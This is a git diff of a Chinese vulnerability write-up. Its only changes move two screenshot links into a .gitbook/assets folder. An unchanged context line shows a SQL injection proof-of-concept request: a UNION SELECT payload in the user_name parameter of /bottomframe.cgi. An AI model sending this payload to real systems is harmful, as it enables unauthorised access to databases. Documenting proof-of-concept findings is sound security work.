@@ -18,7 +18,7 @@
 
 登录页面
 
-![image-20230828161622332](images/image-20230828161622332.png)
+![image-20230828161622332](../.gitbook/assets/image-20230828161622332.png)
 
 验证POC
 
@@ -26,4 +26,4 @@
 /bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23
 ```
 
-![image-20230828161702043](images/image-20230828161702043.png)
+![image-20230828161702043](../.gitbook/assets/image-20230828161702043.png)
